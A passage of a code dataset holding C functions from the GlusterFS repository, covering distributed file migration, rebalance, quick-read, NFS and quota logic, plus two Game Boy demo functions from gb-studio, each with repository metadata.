{\n        gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed: failed to open %s on %s\", loc->path,\n               cached_subvol->name);\n        goto out;\n    }\n\n    /* TODO: move all xattr related operations to fd based operations */\n    ret = syncop_listxattr(cached_subvol, loc, &xattr, NULL, NULL);\n    if (ret < 0) {\n        *fop_errno = -ret;\n        gf_msg(this->name, GF_LOG_WARNING, *fop_errno,\n               DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed:\"\n               \"%s: failed to get xattr from %s\",\n               loc->path, cached_subvol->name);\n        ret = -1;\n        goto out;\n    }\n\n    /* Copying posix acls to the linkto file messes up the permissions*/\n    dht_strip_out_acls(xattr);\n\n    /* Remove the linkto xattr as we don't want to overwrite the value\n     * set on the dst.\n     */\n    dict_del(xattr, conf->link_xattr_name);\n\n    /* We need to error out if this fails as having the wrong shard xattrs\n     * set on the dst could cause data corruption\n     */\n    ret = syncop_fsetxattr(hashed_subvol, dst_fd, xattr, 0, NULL, NULL);\n    if (ret < 0) {\n        *fop_errno = -ret;\n        gf_msg(this->name, GF_LOG_WARNING, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"%s: failed to set xattr on %s\", loc->path, hashed_subvol->name);\n        ret = -1;\n        goto out;\n    }\n\n    if (xattr_rsp) {\n        /* we no more require this key */\n        dict_del(dict, conf->link_xattr_name);\n        dict_unref(xattr_rsp);\n    }\n\n    ret = syncop_fstat(cached_subvol, src_fd, &stbuf, dict, &xattr_rsp);\n    if (ret) {\n        gf_msg(this->name, GF_LOG_ERROR, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed:failed to lookup %s on %s \", loc->path,\n               cached_subvol->name);\n        *fop_errno = -ret;\n        ret = -1;\n        goto out;\n    }\n\n    /* Check again if file has hardlink */\n    ret = __check_file_has_hardlink(this, loc, &stbuf, xattr_rsp, flag, conf,\n                                    fop_errno);\n    if (ret) {\n        if (ret == HARDLINK_MIG_INPROGRESS)\n            ret = 0;\n        goto out;\n    }\n\n    ret = __dht_rebalance_migrate_data(this, cached_subvol, hashed_subvol,\n                                       src_fd, dst_fd, stbuf.ia_size,\n                                       file_has_holes, fop_errno);\n    if (ret) {\n        gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed: %s: failed to migrate data\", loc->path);\n\n        ret = -1;\n        goto out;\n    }\n\n    /* TODO: Sync the locks */\n\n    xdata = dict_new();\n    if (!xdata || dict_set_int8(xdata, \"last-fsync\", 1)) {\n        gf_log(this->name, GF_LOG_ERROR,\n               \"%s: failed to set last-fsync flag on \"\n               \"%s (%s)\",\n               loc->path, hashed_subvol->name, strerror(ENOMEM));\n    }\n\n    ret = syncop_fsync(hashed_subvol, dst_fd, 0, NULL, NULL, xdata, NULL);\n    if (ret) {\n        gf_log(this->name, GF_LOG_WARNING, \"%s: failed to fsync on %s (%s)\",\n               loc->path, hashed_subvol->name, strerror(-ret));\n        *fop_errno = -ret;\n    }\n\n    /* Phase 2 - Data-Migration Complete, Housekeeping updates pending */\n\n    ret = syncop_fstat(cached_subvol, src_fd, &new_stbuf, NULL, NULL);\n    if (ret < 0) {\n        /* Failed to get the stat info */\n        gf_msg(this->name, GF_LOG_ERROR, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed: failed to fstat file %s on %s \", loc->path,\n               cached_subvol->name);\n        *fop_errno = -ret;\n        ret = -1;\n        goto out;\n    }\n\n    /* Lock the entire source file to prevent clients from taking a\n       lock on it as dht_lk does not handle file migration.\n\n       This still leaves a small window where conflicting locks can\n       be granted to different clients. If client1 requests a blocking\n       lock on the src file, it will be granted after the migrating\n       process releases its lock. If client2 requests a lock on the dst\n       data file, it will also be granted, but all FOPs will be redirected\n       to the dst data file.\n    */\n\n    /* Take meta lock  */\n\n    if (conf->lock_migration_enabled) {\n        meta_dict = dict_new();\n        if (!meta_dict) {\n            gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"dict_new failed\");\n\n            *fop_errno = ENOMEM;\n            ret = -1;\n            goto out;\n        }\n\n        ret = dict_set_str(meta_dict, GLUSTERFS_INTERNAL_FOP_KEY, \"yes\");\n        if (ret) {\n            gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_DICT_SET_FAILED,\n                   \"Failed to set dictionary value: key = %s,\"\n                   \" path = %s\",\n                   GLUSTERFS_INTERNAL_FOP_KEY, loc->path);\n            *fop_errno = ENOMEM;\n            ret = -1;\n            goto out;\n        }\n\n        ret = dict_set_int32(meta_dict, GF_META_LOCK_KEY, 1);\n        if (ret) {\n            gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Trace dict_set failed\");\n            *fop_errno = ENOMEM;\n            ret = -1;\n            goto out;\n        }\n\n        ret = syncop_setxattr(cached_subvol, loc, meta_dict, 0, NULL, NULL);\n        if (ret) {\n            gf_msg(this->name, GF_LOG_ERROR, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Trace syncop_setxattr metalock failed\");\n\n            *fop_errno = -ret;\n            ret = -1;\n            goto out;\n        } else {\n            meta_locked = _gf_true;\n        }\n    }\n\n    if (!conf->lock_migration_enabled) {\n        plock.l_type = F_WRLCK;\n        plock.l_start = 0;\n        plock.l_len = 0;\n        plock.l_whence = SEEK_SET;\n\n        ret = syncop_lk(cached_subvol, src_fd, F_SETLK, &plock, NULL, NULL);\n        if (ret) {\n            gf_msg(this->name, GF_LOG_ERROR, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Migrate file failed:\"\n                   \"%s: Failed to lock on %s\",\n                   loc->path, cached_subvol->name);\n            *fop_errno = -ret;\n            ret = -1;\n            goto out;\n        }\n\n        p_locked = _gf_true;\n\n    } else {\n        INIT_LIST_HEAD(&locklist.list);\n\n        ret = syncop_getactivelk(cached_subvol, loc, &locklist, NULL, NULL);\n        if (ret == 0) {\n            gf_log(this->name, GF_LOG_INFO, \"No active locks on:%s\", loc->path);\n\n        } else if (ret > 0) {\n            ret = syncop_setactivelk(hashed_subvol, loc, &locklist, NULL, NULL);\n            if (ret) {\n                gf_msg(this->name, GF_LOG_ERROR, -ret,\n                       DHT_MSG_LOCK_MIGRATION_FAILED, \"write lock failed on:%s\",\n                       loc->path);\n\n                *fop_errno = -ret;\n                ret = -1;\n                goto metaunlock;\n            }\n        } else {\n            gf_msg(this->name, GF_LOG_ERROR, -ret,\n                   DHT_MSG_LOCK_MIGRATION_FAILED,\n                   \"getactivelk failed for file: %s\", loc->path);\n            *fop_errno = -ret;\n        }\n    }\n\n    /* source would have both sticky bit and sgid bit set, reset it to 0,\n       and set the source permission on destination, if it was not set\n       prior to setting rebalance-modes in source  */\n    if (!src_ia_prot.sticky)\n        new_stbuf.ia_prot.sticky = 0;\n\n    if (!src_ia_prot.sgid)\n        new_stbuf.ia_prot.sgid = 0;\n\n    /* TODO: if the source actually had sticky bit, or sgid bit set,\n       we are not handling it */\n\n    ret = syncop_fsetattr(\n        hashed_subvol, dst_fd, &new_stbuf,\n        (GF_SET_ATTR_UID | GF_SET_ATTR_GID | GF_SET_ATTR_MODE), NULL, NULL,\n        NULL, NULL);\n    if (ret) {\n        gf_msg(this->name, GF_LOG_WARNING, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed:\"\n               \"%s: failed to perform setattr on %s \",\n               loc->path, hashed_subvol->name);\n        *fop_errno = -ret;\n        ret = -1;\n        goto metaunlock;\n    }\n\n    /* Because 'futimes' is not portable */\n    ret = syncop_setattr(hashed_subvol, loc, &new_stbuf,\n                         (GF_SET_ATTR_MTIME | GF_SET_ATTR_ATIME), NULL, NULL,\n                         NULL, NULL);\n    if (ret) {\n        gf_log(this->name, GF_LOG_WARNING,\n               \"%s: failed to perform setattr on %s \", loc->path,\n               hashed_subvol->name);\n        *fop_errno = -ret;\n    }\n\n    if (target_changed) {\n        dict_del(dict, GLUSTERFS_POSIXLK_COUNT);\n        ret = dict_set_str(dict, conf->link_xattr_name, hashed_subvol->name);\n        if (ret) {\n            gf_log(this->name, GF_LOG_ERROR,\n                   \"failed to set xattr in dict for %s (linkto:%s)\", loc->path,\n                   hashed_subvol->name);\n            *fop_errno = ENOMEM;\n            ret = -1;\n            goto out;\n        }\n\n        ret = syncop_setxattr(old_target, loc, dict, 0, NULL, NULL);\n        if (ret && -ret != ESTALE && -ret != ENOENT) {\n            gf_msg(this->name, GF_LOG_ERROR, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"failed to set xattr on %s in %s\", loc->path,\n                   old_target->name);\n            *fop_errno = -ret;\n            ret = -1;\n            goto out;\n        } else if (-ret == ESTALE || -ret == ENOENT) {\n            /* The failure ESTALE indicates that the linkto\n             * file on the hashed subvol might have been deleted.\n             * In this case will create a linkto file with new target\n             * as linkto xattr value*/\n            linkto_fd = fd_create(loc->inode, DHT_REBALANCE_PID);\n            if (!linkto_fd) {\n                gf_msg(this->name, GF_LOG_ERROR, errno,\n                       DHT_MSG_MIGRATE_FILE_FAILED, \"%s: fd create failed\",\n                       loc->path);\n                *fop_errno = ENOMEM;\n                ret = -1;\n                goto out;\n            }\n            ret = syncop_create(old_target, loc, O_RDWR, DHT_LINKFILE_MODE,\n                                linkto_fd, NULL, dict, NULL);\n            if (ret != 0 && -ret != EEXIST && -ret != ESTALE) {\n                *fop_errno = -ret;\n                ret = -1;\n                gf_msg(this->name, GF_LOG_ERROR, -ret,\n                       DHT_MSG_MIGRATE_FILE_FAILED,\n                       \"failed to create linkto file on %s in %s\", loc->path,\n                       old_target->name);\n                goto out;\n            } else if (ret == 0) {\n                ret = syncop_fsetattr(old_target, linkto_fd, &stbuf,\n                                      (GF_SET_ATTR_UID | GF_SET_ATTR_GID), NULL,\n                                      NULL, NULL, NULL);\n                if (ret < 0) {\n                    *fop_errno = -ret;\n                    gf_msg(this->name, GF_LOG_ERROR, -ret,\n                           DHT_MSG_MIGRATE_FILE_FAILED,\n                           \"chown failed for %s on %s\", loc->path,\n                           old_target->name);\n                }\n            }\n        }\n    }\n\n    clean_dst = _gf_false;\n\n    /* Posix acls are not set on DHT linkto files as part of the initial\n     * initial xattrs set on the dst file, so these need\n     * to be set on the dst file after the linkto attrs are removed.\n     * TODO: Optimize this.\n     */\n    if (xattr) {\n        dict_unref(xattr);\n        xattr = NULL;\n    }\n\n    /* Set only the Posix ACLs this time */\n    ret = syncop_getxattr(cached_subvol, loc, &xattr, POSIX_ACL_ACCESS_XATTR,\n                          NULL, NULL);\n    if (ret < 0) {\n        if ((-ret != ENODATA) && (-ret != ENOATTR)) {\n            gf_msg(this->name, GF_LOG_WARNING, -ret,\n                   DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Migrate file failed:\"\n                   \"%s: failed to get xattr from %s\",\n                   loc->path, cached_subvol->name);\n            *fop_errno = -ret;\n        }\n    } else {\n        ret = syncop_setxattr(hashed_subvol, loc, xattr, 0, NULL, NULL);\n        if (ret < 0) {\n            /* Potential problem here where Posix ACLs will\n             * not be set on the target file */\n\n            gf_msg(this->name, GF_LOG_WARNING, -ret,\n                   DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Migrate file failed:\"\n                   \"%s: failed to set xattr on %s\",\n                   loc->path, hashed_subvol->name);\n            *fop_errno = -ret;\n        }\n    }\n\n    /* The src file is being unlinked after this so we don't need\n       to clean it up */\n    clean_src = _gf_false;\n\n    /* Make the source as a linkfile first before deleting it */\n    empty_iatt.ia_prot.sticky = 1;\n    ret = syncop_fsetattr(cached_subvol, src_fd, &empty_iatt, GF_SET_ATTR_MODE,\n                          NULL, NULL, NULL, NULL);\n    if (ret) {\n        gf_msg(this->name, GF_LOG_WARNING, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"Migrate file failed:\"\n               \"%s: failed to perform setattr on %s \",\n               loc->path, cached_subvol->name);\n        *fop_errno = -ret;\n        ret = -1;\n        goto metaunlock;\n    }\n\n    /* Free up the data blocks on the source node, as the whole\n        file is migrated */\n    ret = syncop_ftruncate(cached_subvol, src_fd, 0, NULL, NULL, NULL, NULL);\n    if (ret) {\n        gf_log(this->name, GF_LOG_WARNING,\n               \"%s: failed to perform truncate on %s (%s)\", loc->path,\n               cached_subvol->name, strerror(-ret));\n        *fop_errno = -ret;\n    }\n\n    /* remove the 'linkto' xattr from the destination */\n    ret = syncop_fremovexattr(hashed_subvol, dst_fd, conf->link_xattr_name, 0,\n                              NULL);\n    if (ret) {\n        gf_log(this->name, GF_LOG_WARNING,\n               \"%s: failed to perform removexattr on %s (%s)\", loc->path,\n               hashed_subvol->name, strerror(-ret));\n        *fop_errno = -ret;\n    }\n\n    /* Do a stat and check the gfid before unlink */\n\n    /*\n     * Cached file changes its state from non-linkto to linkto file after\n     * migrating data. If lookup from any other mount-point is performed,\n     * converted-linkto-cached file will be treated as a stale and will be\n     * unlinked. But by this time, file is already migrated. So further\n     * failure because of ENOENT should  not be treated as error\n     */\n\n    ret = syncop_stat(cached_subvol, loc, &empty_iatt, NULL, NULL);\n    if (ret) {\n        gf_msg(this->name, GF_LOG_WARNING, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n               \"%s: failed to do a stat on %s\", loc->path, cached_subvol->name);\n\n        if (-ret != ENOENT) {\n            *fop_errno = -ret;\n            ret = -1;\n            goto metaunlock;\n        }\n\n        rcvd_enoent_from_src = 1;\n    }\n\n    if ((gf_uuid_compare(empty_iatt.ia_gfid, loc->gfid) == 0) &&\n        (!rcvd_enoent_from_src) && delete_src_linkto) {\n        /* take out the source from namespace */\n        ret = syncop_unlink(cached_subvol, loc, NULL, NULL);\n        if (ret) {\n            gf_msg(this->name, GF_LOG_WARNING, -ret,\n                   DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"%s: failed to perform unlink on %s\", loc->path,\n                   cached_subvol->name);\n            *fop_errno = -ret;\n            ret = -1;\n            goto metaunlock;\n        }\n    }\n\n    ret = syncop_lookup(this, loc, NULL, NULL, NULL, NULL);\n    if (ret) {\n        gf_msg_debug(this->name, -ret,\n                     \"%s: failed to lookup the file on subvolumes\", loc->path);\n        *fop_errno = -ret;\n    }\n\n    gf_msg(this->name, log_level, 0, DHT_MSG_MIGRATE_FILE_COMPLETE,\n           \"completed migration of %s from subvolume %s to %s\", loc->path,\n           cached_subvol->name, hashed_subvol->name);\n\n    ret = 0;\n\nmetaunlock:\n\n    if (conf->lock_migration_enabled && meta_locked) {\n        dict_del(meta_dict, GF_META_LOCK_KEY);\n\n        ret = dict_set_int32(meta_dict, GF_META_UNLOCK_KEY, 1);\n        if (ret) {\n            gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Trace dict_set failed\");\n\n            *fop_errno = ENOMEM;\n            ret = -1;\n            goto out;\n        }\n\n        if (clean_dst == _gf_false)\n            ret = dict_set_int32(meta_dict, \"status\", 1);\n        else\n            ret = dict_set_int32(meta_dict, \"status\", 0);\n\n        if (ret) {\n            gf_msg(this->name, GF_LOG_ERROR, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Trace dict_set failed\");\n\n            *fop_errno = ENOMEM;\n            ret = -1;\n            goto out;\n        }\n\n        ret = syncop_setxattr(cached_subvol, loc, meta_dict, 0, NULL, NULL);\n        if (ret) {\n            gf_msg(this->name, GF_LOG_ERROR, -ret, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Trace syncop_setxattr meta unlock failed\");\n\n            *fop_errno = -ret;\n            ret = -1;\n            goto out;\n        }\n    }\n\nout:\n    if (clean_src) {\n        /* Revert source mode and xattr changes*/\n        lk_ret = __dht_migration_cleanup_src_file(this, loc, src_fd,\n                                                  cached_subvol, &src_ia_prot);\n        if (lk_ret) {\n            gf_msg(this->name, GF_LOG_WARNING, 0, DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"%s: failed to cleanup source file on %s\", loc->path,\n                   cached_subvol->name);\n        }\n    }\n\n    /* reset the destination back to 0 */\n    if (clean_dst) {\n        lk_ret = syncop_ftruncate(hashed_subvol, dst_fd, 0, NULL, NULL, NULL,\n                                  NULL);\n        if (lk_ret) {\n            gf_msg(this->name, GF_LOG_ERROR, -lk_ret,\n                   DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"Migrate file failed: \"\n                   \"%s: failed to reset target size back to 0\",\n                   loc->path);\n        }\n    }\n\n    if (inodelk_locked) {\n        flock.l_type = F_UNLCK;\n\n        lk_ret = syncop_inodelk(cached_subvol, DHT_FILE_MIGRATE_DOMAIN,\n                                &tmp_loc, F_SETLK, &flock, NULL, NULL);\n        if (lk_ret < 0) {\n            gf_msg(this->name, GF_LOG_WARNING, -lk_ret,\n                   DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"%s: failed to unlock file on %s\", loc->path,\n                   cached_subvol->name);\n        }\n    }\n\n    if (entrylk_locked) {\n        lk_ret = syncop_entrylk(hashed_subvol, DHT_ENTRY_SYNC_DOMAIN,\n                                &parent_loc, loc->name, ENTRYLK_UNLOCK,\n                                ENTRYLK_UNLOCK, NULL, NULL);\n        if (lk_ret < 0) {\n            gf_msg(this->name, GF_LOG_WARNING, -lk_ret,\n                   DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"%s: failed to unlock entrylk on %s\", loc->path,\n                   hashed_subvol->name);\n        }\n    }\n\n    if (p_locked) {\n        plock.l_type = F_UNLCK;\n        lk_ret = syncop_lk(cached_subvol, src_fd, F_SETLK, &plock, NULL, NULL);\n\n        if (lk_ret < 0) {\n            gf_msg(this->name, GF_LOG_WARNING, -lk_ret,\n                   DHT_MSG_MIGRATE_FILE_FAILED,\n                   \"%s: failed to unlock file on %s\", loc->path,\n                   cached_subvol->name);\n        }\n    }\n\n    lk_ret = syncop_removexattr(hashed_subvol, loc,\n                                GF_PROTECT_FROM_EXTERNAL_WRITES, NULL, NULL);\n    if (lk_ret && (lk_ret != -ENODATA) && (lk_ret != -ENOATTR)) {\n        gf_msg(this->name, GF_LOG_WARNING, -lk_ret, 0,\n               \"%s: removexattr failed key %s\", loc->path,\n               GF_PROTECT_FROM_EXTERNAL_WRITES);\n    }\n\n    if (dict)\n        dict_unref(dict);\n\n    if (xattr)\n        dict_unref(xattr);\n    if (xattr_rsp)\n        dict_unref(xattr_rsp);\n\n    if (dst_fd)\n        syncop_close(dst_fd);\n\n    if (src_fd)\n        syncop_close(src_fd);\n    if (linkto_fd)\n        syncop_close(linkto_fd);\n\n    if (xdata)\n        dict_unref(xdata);\n\n    loc_wipe(&tmp_loc);\n    loc_wipe(&parent_loc);\n\n    return ret;\n}", "path": "glusterfs/xlators/cluster/dht/src/dht-rebalance.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* To be called with priv->table.lock held */\n", "func_signal": "void\n__qr_inode_prune(xlator_t *this, qr_inode_table_t *table, qr_inode_t *qr_inode,\n                 uint64_t gen)", "code": "{\n    __qr_inode_prune_data(this, table, qr_inode);\n    if (gen)\n        qr_inode->gen = gen;\n    qr_inode->invalidation_time = __qr_get_generation(this, qr_inode);\n}", "path": "glusterfs/xlators/performance/quick-read/src/quick-read.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* Return value\n * 0 : this node does not migrate the file\n * 1 : this node migrates the file\n *\n * Use the hash value of the gfid to determine which node will migrate files.\n * Using the gfid instead of the name also ensures that the same node handles\n * all hardlinks.\n */\n", "func_signal": "gf_boolean_t\ngf_defrag_should_i_migrate(xlator_t *this, int local_subvol_index, uuid_t gfid)", "code": "{\n    gf_boolean_t ret = _gf_false;\n    int i = local_subvol_index;\n    char *str = NULL;\n    uint32_t hashval = 0;\n    int32_t index = 0;\n    dht_conf_t *conf = NULL;\n    char buf[UUID_CANONICAL_FORM_LEN + 1] = {\n        0,\n    };\n    subvol_nodeuuids_info_t *entry = NULL;\n\n    conf = this->private;\n\n    /* Pure distribute. A subvol in this case\n        will be handled by only one node */\n\n    entry = &(conf->local_nodeuuids[i]);\n    if (entry->count == 1) {\n        return 1;\n    }\n\n    str = uuid_utoa_r(gfid, buf);\n    if (dht_hash_compute(this, 0, str, &hashval) == 0) {\n        index = (hashval % entry->count);\n        if (entry->elements[index].info == REBAL_NODEUUID_MINE) {\n            /* Index matches this node's nodeuuid.*/\n            ret = _gf_true;\n            goto out;\n        }\n\n        /* Brick down - some other node has to migrate these files*/\n        if (gf_uuid_is_null(entry->elements[index].uuid)) {\n            /* Fall back to the first non-null index */\n            index = dht_get_first_non_null_index(entry);\n\n            if (index == -1) {\n                /* None of the bricks in the subvol are up.\n                 * CHILD_DOWN will kill the process soon */\n\n                return _gf_false;\n            }\n\n            if (entry->elements[index].info == REBAL_NODEUUID_MINE) {\n                /* Index matches this node's nodeuuid.*/\n                ret = _gf_true;\n                goto out;\n            }\n        }\n    }\nout:\n    return ret;\n}", "path": "glusterfs/xlators/cluster/dht/src/dht-rebalance.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* Init and cleanup functions for parallel file migration*/\n", "func_signal": "int\ngf_defrag_parallel_migration_init(xlator_t *this, gf_defrag_info_t *defrag,\n                                  pthread_t **tid_array, int *thread_index)", "code": "{\n    int ret = -1;\n    int thread_spawn_count = 0;\n    int index = 0;\n    pthread_t *tid = NULL;\n\n    if (!defrag)\n        goto out;\n\n    /* Initialize global entry queue */\n    defrag->queue = GF_CALLOC(1, sizeof(struct dht_container),\n                              gf_dht_mt_container_t);\n\n    if (!defrag->queue) {\n        gf_msg(this->name, GF_LOG_ERROR, ENOMEM, 0,\n               \"Failed to initialise migration queue\");\n        ret = -1;\n        goto out;\n    }\n\n    INIT_LIST_HEAD(&(defrag->queue[0].list));\n\n    thread_spawn_count = MAX(MAX_REBAL_THREADS, 4);\n\n    gf_msg_debug(this->name, 0, \"thread_spawn_count: %d\", thread_spawn_count);\n\n    tid = GF_CALLOC(thread_spawn_count, sizeof(pthread_t),\n                    gf_common_mt_pthread_t);\n    if (!tid) {\n        gf_msg(this->name, GF_LOG_ERROR, ENOMEM, 0,\n               \"Failed to create migration threads\");\n        ret = -1;\n        goto out;\n    }\n    defrag->current_thread_count = thread_spawn_count;\n\n    /*Spawn Threads Here*/\n    while (index < thread_spawn_count) {\n        ret = gf_thread_create(&(tid[index]), NULL, gf_defrag_task,\n                               (void *)defrag, \"dhtmig%d\", (index + 1) & 0x3ff);\n        if (ret != 0) {\n            gf_msg(\"DHT\", GF_LOG_ERROR, ret, 0, \"Thread[%d] creation failed. \",\n                   index);\n            ret = -1;\n            goto out;\n        } else {\n            gf_log(\"DHT\", GF_LOG_INFO,\n                   \"Thread[%d] \"\n                   \"creation successful\",\n                   index);\n        }\n        index++;\n    }\n\n    ret = 0;\nout:\n    *thread_index = index;\n    *tid_array = tid;\n\n    return ret;\n}", "path": "glusterfs/xlators/cluster/dht/src/dht-rebalance.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* Needs no extra argument since it knows that the fh to be resolved is in\n * resolvefh and that it needs to start looking from the root.\n */\n", "func_signal": "int\nnfs3_fh_resolve_inode_hard(nfs3_call_state_t *cs)", "code": "{\n    int ret = -EFAULT;\n    nfs_user_t nfu = {\n        0,\n    };\n\n    if (!cs)\n        return ret;\n\n    gf_msg_trace(GF_NFS3, 0, \"FH hard resolution for: gfid 0x%s\",\n                 uuid_utoa(cs->resolvefh.gfid));\n    cs->hardresolved = 1;\n    nfs_loc_wipe(&cs->resolvedloc);\n    ret = nfs_gfid_loc_fill(cs->vol->itable, cs->resolvefh.gfid,\n                            &cs->resolvedloc, NFS_RESOLVE_CREATE);\n    if (ret < 0) {\n        gf_msg(GF_NFS3, GF_LOG_ERROR, -ret, NFS_MSG_INODE_LOC_FILL_ERROR,\n               \"Failed to fill loc using gfid: \"\n               \"%s\",\n               strerror(-ret));\n        goto out;\n    }\n\n    nfs_user_root_create(&nfu);\n    ret = nfs_lookup(cs->nfsx, cs->vol, &nfu, &cs->resolvedloc,\n                     nfs3_fh_resolve_inode_lookup_cbk, cs);\n\nout:\n    return ret;\n}", "path": "glusterfs/xlators/nfs/server/src/nfs3-helpers.c", "commit_date": "2020-08-10 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* Functions for the rebalance estimates feature */\n", "func_signal": "uint64_t\ngf_defrag_subvol_file_size(xlator_t *this, loc_t *root_loc)", "code": "{\n    int ret = -1;\n    struct statvfs buf = {\n        0,\n    };\n\n    ret = syncop_statfs(this, root_loc, &buf, NULL, NULL);\n    if (ret) {\n        /* Aargh! */\n        return 0;\n    }\n    return ((buf.f_blocks - buf.f_bfree) * buf.f_frsize);\n}", "path": "glusterfs/xlators/cluster/dht/src/dht-rebalance.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* signal handler for SIGBUS */\n", "func_signal": "void\ncatch_sigbus(int signum)", "code": "{\n    switch (signum) {\n#ifdef __NetBSD__\n        /* Depending on architecture, we can get SIGSEGV */\n        case SIGSEGV: /* FALLTHROUGH */\n#endif\n        case SIGBUS:\n            sigbus_received++;\n            if (!expect_sigbus)\n                exit(EXIT_FAILURE);\n            if (sigbus_received >= MAX_SIGBUS)\n                exit(EXIT_SUCCESS);\n            break;\n        default:\n            printf(\"Unexpected signal received: %d\\n\", signum);\n    }\n}", "path": "glusterfs/tests/bugs/write-behind/bug-1058663.c", "commit_date": "2018-09-12 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/*\n * return _gf_true if enforcement is needed and _gf_false otherwise\n */\n", "func_signal": "gf_boolean_t\nshould_quota_enforce(xlator_t *this, dict_t *dict, glusterfs_fop_t fop)", "code": "{\n    int ret = 0;\n\n    ret = dict_check_flag(dict, GF_INTERNAL_CTX_KEY, GF_DHT_HEAL_DIR);\n\n    if (fop == GF_FOP_MKDIR && ret == DICT_FLAG_SET) {\n        return _gf_false;\n    } else if (ret == -ENOENT) {\n        gf_msg(this->name, GF_LOG_DEBUG, EINVAL, Q_MSG_INTERNAL_FOP_KEY_MISSING,\n               \"No internal fop context present\");\n        goto out;\n    }\nout:\n    return _gf_true;\n}", "path": "glusterfs/xlators/features/quota/src/quota.c", "commit_date": "2020-08-07 00:00:00", "repo_name": "gluster/glusterfs", "stars": 4419, "license": "gpl-2.0", "language": "c", "size": 176289}
{"docstring": "/* Animate sprite */\n", "func_signal": "void animate_sprite()", "code": "{\n  if((time&0x07) == 0) {\n    sframe++;\n    if(sframe == NBSFRAMES)\n      sframe = 0;\n    tile_sprite();\n  }\n}", "path": "gb-studio/buildTools/win32-ia32/gbdk/examples/gb/galaxy/galaxy.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/* Scroll the background, the window and the sprite */\n", "func_signal": "void scroll()", "code": "{\n  /* Update background */\n  bposx.w += bspx.w;\n  bposy.w += bspy.w;\n  SCX_REG = bposx.b.h;\n  SCY_REG = bposy.b.h;\n\n  /* Update window */\n  wposx.w += wspx.w ;\n  wposy.w += wspy.w ;\n  /* X position */\n  if(wposx.b.h >= MAXWINX) {\n    wposx.b.h = MAXWINX;\n    /* Invert speed */\n    wspx.w = -(WORD)wspx.w;\n  } else if(wposx.b.h <= MINWINX) {\n    wposx.b.h = MINWINX;\n    /* Invert speed */\n    wspx.w = -(WORD)wspx.w;\n  }\n  WX_REG = wposx.b.h;\n  /* Y position */\n  if(wposy.b.h >= MAXWINY) {\n    wposy.b.h = MAXWINY;\n    /* Invert speed */\n    wspy.w = -(WORD)wspy.w;\n  } else if(wposy.b.h <= MINWINY) {\n    wposy.b.h = MINWINY;\n    /* Invert speed */\n    wspy.w = -(WORD)wspy.w;\n  }\n  WY_REG = wposy.b.h;\n\n  /* Update sprite */\n  sposx.w += sspx.w;\n  sposy.w += sspy.w;\n  place_sprite();\n}", "path": "gb-studio/buildTools/win32-ia32/gbdk/examples/gb/galaxy/galaxy.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
